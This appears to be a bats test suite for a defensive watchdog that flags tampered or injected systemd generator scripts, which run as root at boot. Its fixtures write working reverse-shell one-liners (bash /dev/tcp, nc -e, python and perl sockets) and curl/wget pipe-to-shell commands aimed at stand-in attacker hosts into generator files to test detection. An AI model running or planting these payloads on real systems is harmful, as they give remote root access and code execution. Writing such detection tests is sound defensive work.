#!/usr/bin/env bats
# L2 bats functional tests for the systemd-generator-watchdog scan script.
#
# systemd runs the executables in its generator dirs (system-generators /
# user-generators) AS ROOT very early at every boot and on `daemon-reload`,
# before most services start — one of the earliest, most powerful root-exec
# surfaces (T1546). A generator that is world-writable / non-root-owned, or a
# text generator containing a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-systemd-generator-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/systemd-generator-watchdog/systemd/systemd-generator-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    GEND="${TMP}/system-generators"; mkdir -p "${GEND}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SDGEN_PROFILE="${PROFILE:-report}" \
    SELFDEF_SDGEN_BASELINE="${BASELINE}" \
    SELFDEF_SDGEN_DIRS="${DIRS_V:-$GEND}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# systemd-fstab-generator shim\nexit 0\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
}

@test "no generator dirs → ok / no_generator_dirs" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_generator_dirs"'
    cap | grep -q '"severity":"ok"'
}

@test "benign generator, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged generators on second run → ok / systemd_generator_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"systemd_generator_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a generator containing an injection pattern → alert / systemd_generator_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"systemd_generator_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable generator → alert" {
    seed_benign
    run_wd
    chmod 0666 "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign generator change → warn / systemd_generator_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# updated shim\ntrue\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"systemd_generator_(changed|new)"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned generator is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious generator" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — generator inventory enumerates early-boot root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in generator → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in generator → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in generator → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable generator): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable generator): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${GEND}/my-generator"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "DELTA detect — ADDED generator (attacker drops a new system-generators executable) surfaces in sample" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho "new"\n' > "${GEND}/distinctive-attacker-generator"
    chmod 0755 "${GEND}/distinctive-attacker-generator"
    run_wd
    cap | grep -q 'distinctive-attacker-generator'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-systemd-generator -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): systemd-generator-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1546 early-boot root-exec persistence — injection alert MUST
    # persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${GEND}/my-generator"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"systemd_generator_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n# systemd-fstab-generator shim\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexit 0\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
    run_wd
    ! cap | grep -q '"event":"systemd_generator_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /lib/systemd/system-generators + /etc/systemd/system-generators + /run axes — injection in ANY → alert)" {
    # systemd reads generators from MULTIPLE dirs. Attacker may plant
    # in any. Lock multi-dir axis.
    GEND2="${TMP}/etc-system-generators"; mkdir -p "${GEND2}"
    seed_benign
    DIRS_V="${GEND} ${GEND2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in second dir.
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${GEND2}/evil-generator"
    chmod 0755 "${GEND2}/evil-generator"
    DIRS_V="${GEND} ${GEND2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (user-generators dir axis: /lib/systemd/user-generators + /etc/systemd/user-generators — distinct from system-generators)" {
    # systemd also reads from user-generators dirs alongside system-
    # generators. Lock the axis is enumerable when multiple dirs
    # are passed (user-generator-dirs alongside system-generator-
    # dirs).
    GEND_USER="${TMP}/user-generators"; mkdir -p "${GEND_USER}"
    seed_benign
    DIRS_V="${GEND} ${GEND_USER}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in user-generators dir.
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${GEND_USER}/evil-user-generator"
    chmod 0755 "${GEND_USER}/evil-user-generator"
    DIRS_V="${GEND} ${GEND_USER}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in systemd generator: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. systemd generators run AS ROOT in the
    # initramfs / very early boot — BEFORE the regular service
    # manager is up. Sister-vector to initramfs-hooks + grub-config
    # + boot-script + kernel-install-hooks on the early-boot
    # persistence brain.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on systemd generator surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the systemd-
    # generator-trigger root-exec persistence surface (T1037 —
    # systemd generators run AS ROOT in initramfs / very early
    # boot; recurring trigger fires on every boot).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on systemd generator surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp systemd-
    # generator rev-shell variants. Perl on every Debian/Ubuntu.
    # Locks perl axis on T1037 systemd-generator-trigger root-
    # exec persistence — generators run AS ROOT in initramfs /
    # very early boot; planted perl rev-shell fires on every
    # boot until detected.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: systemd generator invoking binary from /tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1037
    # systemd-generator-trigger root-exec persistence — generators
    # run AS ROOT in initramfs / very early boot. Beyond inline
    # rev-shell payloads, attackers stage benign-looking
    # generators that invoke a binary in /tmp. Locks writable-
    # root-exec axis on systemd generator surface.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n/tmp/staged_payload\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on systemd-generator surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The systemd-generator-watchdog MUST only emit severity
    # values from the closed set {ok,warn,alert} — never custom
    # values (critical, error, fatal, notice, info). Operator
    # dashboard parsers branch on the literal severity string;
    # an out-of-set value silently falls through routing and the
    # operator never sees the T1037 systemd-generator-trigger
    # root-exec persistence alert. Locks parser contract on the
    # systemd generator early-boot detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: systemd-generator-watchdog NEVER deletes generator scripts — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # systemd-generator-watchdog DETECTS T1037 systemd-
    # generator-trigger root-exec persistence but MUST NEVER
    # emit rm/unlink commands to auto-clean the planted
    # generator. The detected generator may be operator-
    # legitimate (custom mount-unit generator, systemd-sysv-
    # generator, hardware-detection generator) — silent auto-
    # delete would destroy operator baseline state AND could
    # break early-boot dependency resolution. Surveillance,
    # never remediation. Locks anti-data-loss contract on the
    # systemd-generator surveillance substrate.
    seed_benign
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${GEND}/my-generator"
    chmod 0755 "${GEND}/my-generator"
    run_wd
    [ -f "${GEND}/my-generator" ]
    ! grep -qE 'find[[:space:]].*-delete' "${WD}"
    ! grep -qE 'rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(GEND|GENERATOR|FILE|file)' "${WD}"
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # systemd-generator-watchdog runs ON the timer's scheduled
    # fire — scans /etc/systemd/system-generators + /usr/lib/
    # systemd/system-generators for boot-time-injection patterns,
    # emits a verdict, then exits. Type=simple would break
    # timer OnUnitActiveSec semantics. Locks oneshot-probe
    # contract on the systemd-generator-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/systemd-generator-watchdog/systemd/selfdef-systemd-generator.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. systemd-generator-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # systemd-generator-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # systemd-generator-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/systemd-generator-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'systemd-generator-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: systemd-generator-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. systemd-generator-watchdog is a DETECT-only watchdog: surveils +
    # emits verdicts, NEVER writes back. Locks no-auto-fix on
    # the systemd-generator-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/systemd-generator-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (systemd-generator-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # Locks set -u discipline on the systemd-generator-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/systemd-generator-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (systemd-generator-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # systemd-generator-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/systemd-generator-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}
